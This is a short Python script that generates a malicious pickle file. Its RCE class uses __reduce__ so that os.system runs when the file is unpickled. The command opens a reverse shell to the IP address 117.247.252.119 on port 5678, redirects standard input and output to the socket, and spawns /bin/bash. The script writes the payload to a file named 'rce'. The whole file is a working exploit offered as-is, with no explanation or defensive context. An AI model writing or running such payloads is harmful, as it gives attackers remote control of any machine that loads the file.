import pickle, os

class RCE:
    def __reduce__(self):
        cmd = '''python -c "import sys,socket,os,pty;s=socket.socket();s.connect(('117.247.252.119',5678));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')"'''
        return(os.system,(cmd,))

if __name__ == "__main__":
    with open("rce","wb") as f:
        f.write(pickle.dumps(RCE()))
